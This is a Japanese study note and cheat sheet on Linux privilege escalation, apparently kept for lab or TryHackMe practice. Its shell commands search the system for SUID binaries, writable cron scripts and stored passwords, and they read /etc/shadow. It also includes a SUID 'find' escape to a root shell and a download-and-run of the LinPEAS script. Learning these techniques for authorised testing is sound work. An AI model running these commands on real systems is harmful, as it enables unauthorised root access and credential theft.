---
tags: [hacking, skill, privilege-escalation, linux]
category: Privilege Escalation
difficulty: intermediate
learned_from:
date: 2026-03-19
---

# Linux 権限昇格 (PrivEsc)

## 概要
一般ユーザーからroot権限を取得するための手法集。

## 最初に実行する列挙コマンド

```bash
# 現在のユーザー確認
whoami && id

# sudo権限確認（最重要）
sudo -l

# SUID/SGIDファイル探索
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Cronジョブ確認
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 書き込み可能ファイル
find / -writable -type f 2>/dev/null | grep -v proc

# パスワード・認証情報
find / -name "*.txt" 2>/dev/null | xargs grep -l "password" 2>/dev/null
cat /etc/passwd
cat /etc/shadow  # root権限が必要

# OSバージョン（既知脆弱性確認）
uname -a
cat /etc/os-release
```

## 主要な手法

### 1. sudo権限の悪用
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim など
# → GTFOBins で調べる
```
参考: [GTFOBins](https://gtfobins.github.io/)

### 2. SUID悪用
```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/find などが出たら GTFOBins で確認
/usr/bin/find . -exec /bin/sh -p \; -quit
```

#### find に SUID を手動で設定する場合（練習環境）

```bash
sudo chmod 4755 /usr/bin/find
# または
sudo chmod u+s /usr/bin/find

# 確認
ls -al /usr/bin/find
# -rwsr-xr-x 1 root root ...
```

SUID が立つと root 権限でファイルを読み取れる：

```bash
# root 権限のファイルを読む
find /root/root.txt -exec cat {} \;

# root シェルを取得
find . -exec /bin/bash -p \; -quit
bash# whoami
# root
```

### 3. Cronジョブ悪用
```bash
# ワイルドカードやパス未指定のスクリプトを探す
cat /etc/crontab
# rootが実行するスクリプトに書き込めるか確認
ls -la /path/to/script.sh
```

### 4. パスワード再利用・認証情報探索
```bash
find / -name "config*" 2>/dev/null
find / -name "*.conf" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
```

### 5. カーネル脆弱性
```bash
uname -a
# searchsploit で確認
searchsploit linux kernel <version>
```

## 自動化ツール

```bash
# LinPEAS（最も使われる）
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
./LinEnum.sh
```

## ハマったポイント
-

## 参考リンク
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks: Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [TryHackMe: Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)

## 関連スキル
- [[Windows-PrivEsc]]
